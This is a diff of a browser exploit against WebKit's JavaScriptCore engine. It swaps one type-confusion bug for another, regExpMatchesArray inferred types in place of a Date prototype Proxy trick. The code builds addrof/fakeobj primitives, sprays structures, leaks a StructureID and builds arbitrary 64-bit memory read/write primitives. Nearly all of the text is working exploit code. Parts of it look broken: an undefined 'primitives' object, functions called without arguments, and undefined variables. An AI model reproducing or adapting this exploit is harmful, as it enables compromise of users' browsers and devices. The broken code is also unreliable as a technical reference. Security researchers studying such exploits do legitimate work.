@@ -1,201 +1,166 @@
-<script src="utils.js"> </script>
 <script>
-/*
- * Copyright (C) 2019 Alexandro Luongo (w00dl3cs).
- *
- * Bug found by Luca Todesco (qwertyoruiop)
- * Original PoC here: http://rce.party/wtf.js
- */
-//let print = alert;
-var datePrototype = undefined;
-let stage1 = {
-        addrof: function(obj) {
-        let arg = [1.1, 2.2, 3.3];
-
-        let date = new Date();
-        date[1] = 1;
-
-        function InfoLeaker(arg) {
-            0 in date;
-            return arg[0];
-        }
-
-        for (var i = 0; i < 10000; ++i)
-            InfoLeaker(arg);
-
-        var handler = {
-            has: function() {
-                arg[0] = obj;
-                return false;
-            }
-        }
-
-        Object.setPrototypeOf(Date.prototype, new Proxy(datePrototype, handler));
-
-        var addr = InfoLeaker(arg);
-
-        Object.setPrototypeOf(Date.prototype, datePrototype);
-
-        if (addr !== 1.1 && typeof addr !== 'object')
-            return Int64.fromDouble(addr);
-
-       fail("Could not leak address using 'addrof' primitive!");
-    },
-        fakeobj: function(addr) {
-        let arg = [1.1, 2.2, 3.3];
-
-        let date = new Date();
-        date[1] = 1;
-
-        function ObjFaker(arg) {
-            0 in date;
-            arg[0] = addr;
-        }
-
-        for (var i = 0; i < 10000; ++i)
-            ObjFaker(arg);
-
-        var handler = {
-            has: function() {
-                arg[0] = {};
-                return false;
-            }
-        }
-
-        Object.setPrototypeOf(Date.prototype, new Proxy(datePrototype, handler));
-
-        ObjFaker(arg);
-
-        Object.setPrototypeOf(Date.prototype, datePrototype);
-
-        var obj = arg[0];
-        if (typeof obj === 'object')
-            return obj;
-
-       fail("Could not inject fake object using 'fakeobj' primitive!");
-    }
-};
-let fail = function fail(x)
-    {
-        alert('FAIL: ' + x);
-        location.reload();
-        throw null;
-    }
-    
-function init() {
-datePrototype = Object.getPrototypeOf(Date.prototype);
+let print = alert;
+let convert = new ArrayBuffer(0x8);
+let f64 = new Float64Array(convert);
+let u32 = new Uint32Array(convert);
+let BASE = 0x100000000;
+function i2f(x) {
+      u32[0] = x % BASE;
+      u32[1] = (x - (x % BASE)) / BASE;
+      return f64[0];
 }
-//
-// Update: December, 2019
-//
-// On December, 5th 2019, security researcher Wang Yong (@ThomasKing2014) from
-// Alibaba Security presented his talk "Thinking outside the JIT Compiler" at
-// BlackHat Europe, proposing two different methods to bypass StructureID
-// randomization.
-//
-// You can find his presentation here (for reference):
-// https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf
+function f2i(x) {
+      f64[0] = x;
+      return u32[0] + BASE * u32[1];
+}
+function i2jsv(x) {
+    u32[0] = (x % BASE);
+    u32[1] = ((x - (x % BASE)) / BASE) - 0x10000;
+    return f64[0];
+}
+function hex(x) {
+      return `0x${x.toString(16)}`
+}
+function d(x) {
+    print(describe(x));
+}
+function pf(x) {
+    print(hex(f2i(x)));
+}
+function ph(x) {
+    print(hex(x));
+}
+function gc() {
+      for (let i = 0; i < 0x10; i++) {
+              new ArrayBuffer(0x1000000);
+          }
+}
+function makeJITFunc() {
+    function target(num) {
+        for (var i = 2; i < num; i++) {
+            if (num % i === 0) {
+                return false;
+            }
+        }
+        return true;
+    }
+    // Force JIT compilation.
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    return target;
+}
+// /System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc poc.js
+// The PoC will confuse objX with objY.
+// objX will have structure S1, objY structure S2.
+//let objX = {objProperty: {fetchme: [1.1]}};
+//let objY = {doublePropety: [2.2]};             // 0x4141414141414141 in memory
+//let target = [1.1,2.2,3.3];
+let objX = {objProperty: {fetchme : 0x1234}};
+let objY = {doubleProperty: []};
+let victim = [1.1, 2.2, 3.3, 4.4, 5.5];
+let structs = [];
+for (let i = 0; i < 0x1000; i++) {
+    var tmp = [1.1];
+    tmp.pointer = i2f(0x1234);
+    tmp['spray' + i.toString()] = 3.3;
+    structs.push(tmp);
+}
+// Create a plain array with indexing type SlowPutArrayStorage. This is equivalent to
+// `arrayStructureForIndexingTypeDuringAllocation(ArrayWithSlowPutArrayStorage)` in C++.
+function createArrayWithSlowPutArrayStorage() {
+    let protoWithIndexedAccessors = {};
+    Object.defineProperty(protoWithIndexedAccessors, 1337, { get() { return 1337; } });
+    // Compile a function that will end up creating an array with SlowPutArrayStorage.
+    function helper(i) {
+        // After JIT compilation, this new Array call will construct a normal array (with the
+        // original Array prototype) with SlowPutArrayStorage due to profiling information from
+        // previous executions (which all ended up transitioning to SlowPutArrayStorage).
+        let a = new Array;
+        if (i > 0) {
+            // Convert the array to SlowPutArrayStorage by installing a prototype with indexed
+            // accessors. This object can, however, not be used directly as the prototype is
+            // different and thus the structure has changed.
+            Object.setPrototypeOf(a, protoWithIndexedAccessors);
+        }
+        return a;
+    }
+    for (let i = 1; i < 10000; i++) {
+        helper(i);
+    }
+    return helper(0);
+}
+// Helper object using inferred types.
+let obj = {};
+obj.inlineProperty1 = 1337;
+obj.inlineProperty2 = 1338;
+obj.oolProperty1 = objX;        // Inferred type of 'oolProperty1' will be ObjectWithStructure S1.
+// 'obj' now has structure S3.
+// Create the same structure (S4) that will later (when having a bad time) be used as
+// regExpMatchesArrayWithGroupsStructure. Since property values are assigned during the initial
+// structure transition, inferred types for all property values are created.
+let a = createArrayWithSlowPutArrayStorage();       // a has Structure S4,
+a.index = 42;                                       // S5,
+a.input = "foobar";                                 // S6,
+a.groups = obj;                                     // and S7.
+// The inferred type for the .groups property will be ObjectWithStructure S3.
+// Inferred type for this property will be ObjectWithStructure S7.
+global = a;
+// Must assign twice so the JIT uses the inferred type instead of assuming that
+// the property is constant and installing a replacement watchpoint to
+// deoptimize whenever the property is replaced.
+global = a;
+// Have a bad time. This will attempt to recreate the global regExpMatchesArrayWithGroupsStructure
+// (to use an array with SlowPutArrayStorage), but since the same structure transitions were
+// performed before, it will actually reuse the existing structure S7. As no property values are
+// assigned, all inferred types for structure S7 will still be valid.
+Object.defineProperty(Array.prototype, 1337, { get() { return 1337; } });
+// Compile a function that uses the inferred value of 'global' to omit type checks.
+function hax(val) {
+  var re = global.groups.oolProperty1.objProperty.fetchme;
+  global.groups.oolProperty1.objProperty.fetchme = val;
+  return re;
+}
+for (let i = 0; i < 10000; i++) {
+    hax(i2jsv(0x0108211700001001 + i));
+}
+// Create an ObjectWithStructure S7 which violates the inferred type of .groups (and potentially
+// other properties) due to createRegExpMatchesArray using putDirect.
+let match = "hax".match(/(?<oolProperty1>hax)/);
+// match.groups has structure S8 and so assignments to it won't invalidate inferred types of S7.
+match.groups.oolProperty1 = objY;       // This property overlaps with oolProperty1 of structure S3.
+// The inferred type for 'global' is ObjectWithStructure S4 so watchpoints will not be fired.
+global = match;
+// backup original structure
+let backup = hax(1);
+let addrof = function (obj) {
+  hax(backup);
+  victim[0] = obj;
+  hax(i2jsv(0x0108211700001000));
+  return victim[2];
+}
+let fakeobj = function (addr) {
+  hax(i2jsv(0x0108211700001000));
+    victim[2] = addr;
+    hax(backup);
+  return victim[0];
+}
+var primitives;
+primitives.addrof = addrof();
+primitives.fakeobj = fakeobj();
+let stage1 = primitives;
+
 //
 // As a public technique to bypass such mitigation has been released, I think
 // it's time to update this exploit to reflect the changes accordingly.
 //
-
-var structs = [];
-
-function sprayStructures() {
-    for (var i = 0; i < 1000; i++) {
-        var a = [13.37];
-        a['prop'] = 13.37;
-        a['prop' + i] = 13.37;
-        structs.push(a);
-    }
-}
-
-var structs1 = [];
-
-function sprayStructures1() {
-    for (var i = 0; i < 1000; i++) {
-        var a = [13.37];
-        a['prop'] = 13.37;
-        a['prop' + i] = 13.37;
-        structs1.push(a);
-    }
-}
-
-function pwn() {
-    init();
-    var primitives = stage1;
-    sprayStructures1();
-    var victim1 = structs1[Math.floor(Math.random() * structs1.length)];
-    var jsDoubleCellHeader = new Int64([
-        0x00, 0x02, 0x00, 0x00,                // m_structureID (0x00000200)
-        0x7,                                   // m_indexingTypeAndMisc (ArrayWithDouble)
-        0x20,                                  // m_type (ArrayType)
-        0x8,                                   // m_flags (OverridesGetOwnPropertySlot)
-        0x1                                    // m_cellState (DefinitelyWhite)
-    ]);
-
-    var jsContiguousCellHeader = new Int64([
-        0x00, 0x02, 0x00, 0x00,                // m_structureID (0x00000200)
-        0x9,                                   // m_indexingTypeAndMisc (ArrayWithContiguous)
-        0x20,                                  // m_type (ArrayType)
-        0x8,                                   // m_flags (OverridesGetOwnPropertySlot)
-        0x1                                    // m_cellState (DefinitelyWhite)
-    ]);
-    var container = {
-        jsCellHeader: jsContiguousCellHeader.asJSValue(),
-        butterfly: victim1
-    };
-
-    var containerAddr = primitives.addrof(container);
-    print("[+] Container @ " + containerAddr);
-
-    var fakeArrayAddr = Add(containerAddr, 0x10);
-    print("[+] Fake Array @ " + fakeArrayAddr);
-
-    var driver1 = primitives.fakeobj(fakeArrayAddr.asDouble());
-    alert("made it");
-    //alert(typeof driver1)
-    while (!(driver1 instanceof Array)) {
-        jsDoubleCellHeader.assignAdd(jsDoubleCellHeader, Int64.One);
-        jsContiguousCellHeader.assignAdd(jsContiguousCellHeader, Int64.One);
-
-        container.jsCellHeader = jsContiguousCellHeader.asJSValue();
-    }
-    // ArrayWithContiguous
-    var boxed = [{}];
-    alert("here")
-    // ArrayWithDouble
-    var unboxed = [13.37, 13.37];
-    driver1[1] = unboxed;
-
-    var shared_butterfly = Int64.fromDouble(victim1[1]);
-    print("[+] Shared butterfly @ " + shared_butterfly);
-    driver1[1] = boxed;
-
-    victim1[1] = shared_butterfly.asDouble();
-    container.jsCellHeader = jsDoubleCellHeader.asJSValue();
-
-    //
-    // Time to upgrade exploit primitives!
-    //
-    primitives = {
-        addrof: function(obj) {
-            boxed[0] = obj;
-            return Int64.fromDouble(unboxed[0]);
-        },
-
-        fakeobj: function(addr) {
-            unboxed[0] = addr.asDouble();
-            return boxed[0];
-        },};
-    alert("testing");
-    alert("done")
-    //alert("addr:" + primitives.addrof([]));
-    sprayStructures();
-
-    var targetArray = new Array();
-    function leakStructureId(victimObj) {
+function leakStructureId(victimObj) {
     var symbolCellHeader = new Int64([
         0x00, 0x00, 0x00, 0x00,
         0x0,
@@ -212,7 +177,7 @@ function pwn() {
     var container = {
         jsCellHeader: symbolCellHeader.asJSValue(),
         m_uid: null,
-        length_flag: lengthAndFlag.asJSValue(),
+        length_flag: lengthAndFlag.asDouble(),
         description: victimObj
     };
 
@@ -225,7 +190,7 @@ function pwn() {
     container.m_uid = fakeString;
 
     var fakeSymbol = primitives.fakeobj(fakeSymbolAddr.asDouble());
-    alert(fakeStringAddr)
+
     var structureId = "";
     var symbolDescription = Symbol.prototype.toString.call(fakeSymbol);
     for (var i = 0; i < 2; ++i)
@@ -234,56 +199,195 @@ function pwn() {
     return structureId.match(/.{1,2}/g).map(x => "0x" + x).reverse();
 }
 
-    var structureId = leakStructureId(targetArray);
-    //alert("StructureID:" + structureId);
-    alert("done leak");
-    var jsCellHeader = new Int64([
-        ...structureId,                        // m_structureID
-        0x0,                                   // m_indexingTypeAndMisc (ArrayWithContiguous)
-        0x27,                                  // m_type (ArrayType)
-        0x18,                                   // m_flags (OverridesGetOwnPropertySlot)
-        0x1                                    // m_cellState (DefinitelyWhite)
-    ]);
+var structs = [];
 
-   // var victim = structs[Math.floor(Math.random() * structs.length)];
-    var hax = new Uint8Array(0x1000);
-  
-    var container1 = {
-        jsCellHeader: jsCellHeader.asJSValue(),
-        butterfly: false,
-        vector: hax,
-        lengthAndFlags: (new Int64('0x0001000000000010')).asJSValue()
-    };
-
-    var addr1 = primitives.addrof(container1);
-    print("[+] Container @ " + addr1);
-
-    var fakeArray1 = Add(addr1, 0x10);
-    print("[+] Fake Array @ " + fakeArray1);
-
-    var driver2 = primitives.fakeobj(fakeArray1.asDouble());
-
-    if (!(driver2 instanceof Float64Array))
-        alert("Could not create fake Array!");
-
-    //
-    // For brevity, the remaining part of the exploitation process has
-    // been redacted: you can find the in-depth analysis in other
-    // write-ups available on this repository.
-    //
-    // Keep in mind that WebAssembly memory is now caged, and that
-    // at the time of writing there is no public technique which can
-    // be used to bypass that mitigation. But with Structure ID randomization
-    // not being a problem anymore, one could achieve arbitrary memory
-    // R/W primitives by abusing boxed/unboxed arrays.
-    //
-    // If you want to read more about the mitigations discussed here,
-    // ypu can have a look at the following commits on the WebKit repository:
-    //
-    // * WebAssembly Gigacage:      https://github.com/WebKit/webkit/commit/385d20a0e36c9a7db638b26273ddc9c92b573cdc
-    // * StructureID randomization: https://github.com/WebKit/webkit/commit/f19aec9c6319a216f336aacd1f5cc75abba49cdf
-    //
+function sprayStructures() {
+    for (var i = 0; i < 1000; i++) {
+        var a = [13.37];
+        a['prop'] = 13.37;
+        a['prop' + i] = 13.37;
+        structs.push(a);
+    }
 }
+
+function pwn() {
+    sprayStructures();
+
+    var targetArray = new Array();
+    var structureId = leakStructureId(targetArray);
+
+// post spectre & gigacage compatible
+    // however, memory rw is backed by normal js objects and not typed
+    // arrays, and is less reliable
+
+    // "normal" arrays store values in butterfly, and typed arrays store
+    // their values in m_vector.
+    // butterfly is not cached, but vector is -- so until gigacage is
+    // killed old-style typed arrays can't be used for rw primitive
+
+    // first property offset
+    var FPO = typeof(SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10;
+
+    var structure_spray = []
+    for (var i = 0; i < 1000; ++i) {
+        // last property is 0xfffffff because we want that value to
+        // preceed the manager, so when manager gets reused as
+        // butterfly, it's vectorLength is big enough
+        var ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff}
+        ary['prop'+i] = 1
+        structure_spray.push(ary)
+    }
+
+    var manager = structure_spray[500]
+    var leak_addr = stage1.addrof(manager)
+    //print('leaking from: '+ hex(leak_addr))
+
+    // properties are stored in butterfly to the right of pointer
+    // so when we create a fake object with butterfly pointing to
+    // manager, we would be only able to access memory which lies after
+    // the manager, since we can't reliably access properties: we don't
+    // even know structure layout we'd end up using, see get_mem_old's
+    // instanceof loop for more info
+    function alloc_above_manager(expr) {
+        var res
+        do {
+            for (var i = 0; i < ALLOCS; ++i) {
+                structure_spray.push(eval(expr))
+            }
+            res = eval(expr)
+        } while (stage1.addrof(res) < leak_addr)
+        return res
+    }
+
+    var unboxed_size = 100
+
+    // Two arrays are created: unboxed and boxed
+    // their butterflies are then set to same value
+    // so unboxed[i] would point to same memory as boxed[i]
+    // this leads to easy type confusion:
+    // JSValue (inc. pointers) with floats
+    // see saelo's phrack article, look for "JSC defines a set of
+    // different indexing types".
+    // JSC sees huge array containing only floats, so they'd be stored
+    // as floats and retrived as floats, not as normal JSValue's
+    var unboxed = alloc_above_manager('[' + '13.37,'.repeat(unboxed_size) + ']')
+    // this one would have indexing type of array with objects in it
+    var boxed = alloc_above_manager('[{}]')
+    var victim = alloc_above_manager('[]')
+
+    // Will be stored out-of-line at butterfly - 0x10
+    victim.p0 = 0x1337
+    function victim_write(val) {
+        victim.p0 = val
+    }
+    function victim_read() {
+        return victim.p0
+    }
+
+    i32[0] = structureid               // Structure ID
+    i32[1] = 0x01082007 - 0x10000 // Fake JSCell metadata, adjusted for boxing
+    var outer = {
+        p0: 0, // Padding, so that the rest of inline properties are 16-byte aligned
+        p1: f64[0],
+        p2: manager,
+        // parts of spectre mitigation, but just won't be used on older
+        // versions
+        p3: 0xfffffff, // Butterfly indexing mask
+    }
+
+    // this would cause p1 to be interpreted as an object
+    // with p2==manager==leak_addr being used as butterfly
+    var fake_addr = stage1.addrof(outer) + FPO + 0x8
+    //print('fake obj @ ' + hex(fake_addr))
+
+    var unboxed_addr = stage1.addrof(unboxed)
+    var boxed_addr = stage1.addrof(boxed)
+    var victim_addr = stage1.addrof(victim)
+    //print('leak ' + hex(leak_addr)
+        //+ '\nunboxed ' + hex(unboxed_addr)
+        //+ '\nboxed ' + hex(boxed_addr)
+        //+ '\nvictim ' + hex(victim_addr))
+
+    var holder = {fake: {}}
+    holder.fake = stage1.fakeobj(fake_addr)
+
+    // From here on GC would be uncool
+
+    // Share a butterfly for easier boxing/unboxing
+    var shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8])
+    var boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8]
+    holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly)
+
+    var victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8]
+    function set_victim_addr(where) {
+        holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 0x10)
+    }
+    function reset_victim_addr() {
+        holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly
+    }
+
+    var stage2 = {
+        addrof: function(victim) {
+            boxed[0] = victim
+            return f2i(unboxed[0])
+        },
+
+        fakeobj: function(addr) {
+            unboxed[0] = (new Int64(addr)).asDouble()
+            return boxed[0]
+        },
+
+        write64: function(where, what) {
+            set_victim_addr(where)
+            victim_write(this.fakeobj(what))
+            reset_victim_addr()
+        },
+
+        read64: function(where) {
+            set_victim_addr(where)
+            var res = this.addrof(victim_read())
+            reset_victim_addr()
+            return res
+        },
+
+        writeInt64: function(where, what) {
+            set_victim_addr(where)
+            victim_write(this.fakeobj(f2i(what.asDouble())))
+            reset_victim_addr()
+        },
+
+        readInt64: function(where) {
+            set_victim_addr(where)
+            var res = this.addrof(victim_read())
+            reset_victim_addr()
+            return new Int64(res)
+        },
+
+        read: function(addr, length) {
+            var a = new Array(length);
+            var i;
+
+            for (i = 0; i + 8 < length; i += 8) {
+                v = this.readInt64(addr + i).bytes()
+                for (var j = 0; j < 8; j++) {
+                    a[i+j] = v[j];
+                }
+            }
+
+            v = this.readInt64(addr + i).bytes()
+            for (var j = i; j < length; j++) {
+                a[j] = v[j - i];
+            }
+
+            return a
+        },
+
+        write: function(addr, data) {
+            throw 'maybe later'
+        },
+    }
+
+
+  }
 pwn();
-    
-    </script>
+</script>
